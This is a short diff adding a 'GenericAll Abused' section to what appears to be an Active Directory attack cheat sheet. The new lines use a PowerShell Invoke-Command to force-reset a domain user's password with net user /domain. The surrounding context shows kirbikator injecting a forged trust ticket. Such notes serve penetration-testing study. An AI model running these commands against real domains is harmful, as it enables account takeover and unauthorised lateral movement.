@@ -786,6 +786,14 @@ forged trust ticket:**
 .\kirbikator.exe lsa .\CIFS.eurocorp-dc.corporate.local.kirbi
 ```
 
+### GenericAll Abused
+
+**1. Full control with GenericAll. Method to change the password:**
+```powershell
+# User password change
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user mickey.mouse newpassword /domain}
+```
+
 # Trust Abuse MSSQL Servers
 
 #### Pre-requisites
